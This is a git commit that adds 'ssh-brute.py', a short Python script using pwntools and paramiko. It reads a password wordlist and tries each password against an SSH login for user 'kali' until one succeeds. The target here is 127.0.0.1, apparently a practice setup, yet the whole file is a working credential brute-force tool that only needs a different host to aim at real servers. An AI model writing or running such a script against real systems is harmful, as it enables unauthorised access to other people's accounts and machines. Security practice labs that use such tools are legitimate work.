6503710a19ffe4144f6d0db1e0d901ec43b371f3
trixtertrap <thanujyenna97@gmail.com>
2024-08-30 18:28:44 -0400

    The first version

---
+++ ssh-brute.py
@@ -0,0 +1,23 @@
+from pwn import *
+import paramiko 
+host = '127.0.0.1'
+username = 'kali'
+
+attempts = 0
+    
+with open ('passwords.txt', 'r') as password_list:
+    for password in password_list:
+        password = password.strip('\n')
+        try:
+            print("[{}] Attempting password : '{}'!".format(attempts, password))
+            response = ssh(host=host, user=username, password=password, timeout=1)
+            if response.connected:
+                print("[>] Valid Password found '{}'!".format(password))
+                response.close()
+                break
+            response.close()
+        except paramiko.ssh_exception.AuthenticationException:
+            print('[X] Invalid Password!')
+        attempts +=1
+                
+            
